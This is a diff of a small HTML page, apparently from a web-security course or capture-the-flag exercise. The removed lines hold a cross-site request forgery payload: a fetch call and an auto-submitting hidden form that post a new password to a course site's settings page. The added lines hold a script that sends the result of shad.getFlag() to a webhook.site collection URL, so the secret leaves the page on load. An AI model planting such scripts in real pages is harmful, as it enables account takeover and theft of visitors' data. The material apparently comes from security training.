@@ -5,34 +5,13 @@
 <h1>My First Heading</h1>
 <p>My first paragraph.</p>
 <p>My first paragraph 2.</p>
-<!-- <script>
+<script>
   
-fetch('https://cats.is-course.ru/settings', {
-  method: 'POST',
+fetch('	https://webhook.site/b8080a04-6058-4500-b044-250b7e53831c', {
   mode: 'no-cors',
-  credentials: 'include',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded', 'Access-Control-Allow-Origin': '*'},
-  body: 'password=LupaLupaLupa1236%23&confirm-password=LupaLupaLupa1236%23'
+  body: shad.getFlag()
 });
 
-</script> -->
-<script>
-function redirectPost(url, data) {
-    var form = document.createElement('form');
-    document.body.appendChild(form);
-    form.method = 'post';
-    form.action = url;
-    for (var name in data) {
-        var input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = name;
-        input.value = data[name];
-        form.appendChild(input);
-    }
-    form.submit();
-}
-
-redirectPost('https://cats.is-course.ru/settings', { password: 'LupaLupaLupa1236#', 'confirm-password': 'LupaLupaLupa1236#' });
 </script>
   
 </body>
